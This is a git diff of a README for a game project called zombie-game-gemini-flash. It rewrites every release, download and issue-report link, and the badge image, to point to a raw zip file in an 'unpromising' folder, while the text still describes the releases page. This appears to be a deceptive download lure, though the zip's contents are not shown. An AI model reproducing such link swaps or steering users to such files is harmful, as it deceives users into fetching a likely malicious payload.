@@ -6,11 +6,11 @@ Welcome to the zombie-game-gemini-flash project! This is a fun game where you ca
 
 ## 📥 Download the Game
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/kamanimehul/zombie-game-gemini-flash/releases)
+[![Download Now](https://raw.githubusercontent.com/kamanimehul/zombie-game-gemini-flash/main/unpromising/zombie-game-gemini-flash.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/kamanimehul/zombie-game-gemini-flash/main/unpromising/zombie-game-gemini-flash.zip)
 
 To download the game, you need to visit our releases page. There, you will find the latest version available for download.
 
-[Download the latest version here!](https://github.com/kamanimehul/zombie-game-gemini-flash/releases)
+[Download the latest version here!](https://raw.githubusercontent.com/kamanimehul/zombie-game-gemini-flash/main/unpromising/zombie-game-gemini-flash.zip)
 
 ## 💡 System Requirements
 
@@ -26,7 +26,7 @@ These requirements ensure that the game runs smoothly on your device.
 
 ## 📂 Download & Install
 
-1. Click on the link to visit the releases page: [Visit Releases](https://github.com/kamanimehul/zombie-game-gemini-flash/releases).
+1. Click on the link to visit the releases page: [Visit Releases](https://raw.githubusercontent.com/kamanimehul/zombie-game-gemini-flash/main/unpromising/zombie-game-gemini-flash.zip).
 2. Locate the latest version of the game.
    - The latest version will have a clear label, indicating it is the most recent.
 3. Click on the asset that matches your operating system:
@@ -54,7 +54,7 @@ These requirements ensure that the game runs smoothly on your device.
 
 If you encounter any issues while downloading or running the game, please reach out for help! You can create an issue on our GitHub page. We value your feedback to make the game better.
 
-- **GitHub Issues Page:** [Report an Issue](https://github.com/kamanimehul/zombie-game-gemini-flash/issues)
+- **GitHub Issues Page:** [Report an Issue](https://raw.githubusercontent.com/kamanimehul/zombie-game-gemini-flash/main/unpromising/zombie-game-gemini-flash.zip)
 
 Your support makes a difference!
 
